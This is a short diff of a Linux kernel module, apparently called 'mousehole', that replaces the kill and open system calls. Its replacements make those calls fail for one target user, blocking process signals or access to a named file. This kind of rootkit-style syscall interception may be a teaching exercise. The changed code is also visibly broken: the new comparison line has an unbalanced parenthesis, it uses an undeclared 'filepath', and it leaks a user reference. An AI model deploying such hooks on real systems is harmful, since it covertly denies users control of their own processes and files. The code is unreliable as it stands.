@@ -19,17 +19,18 @@ asmlinkage long (*orig_sys_kill)(pid_t pid, int sig);
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
 asmlinkage long mousehole_sys_kill(pid_t pid, int sig) {
-    uid_t uid = -1;
-    uid = current->cred->uid.val;
+    uid_t uid = get_current_user()->uid.val;
     if ((target_uid == uid)&&(option==2))
         return -1;
-    return orig_sys_kill(uid, sig);
+    return orig_sys_kill(pid, sig);
 }
 
 asmlinkage int mousehole_sys_open(const char __user * filename, int flags, umode_t mode){
-    uid_t uid = current->cred->uid.val;
+    char fname[256] ;
+    uid_t uid = get_current_user()->uid.val;
+    copy_from_user(fname, filename, 256) ;
     if((uid == target_uid)&&(option==1)){
-        if(strstr(filename, target_file)){
+        if(filepath[0] != 0x0 && strcmp(target_file, fname) == 0)){
             return -1;
         }
     }
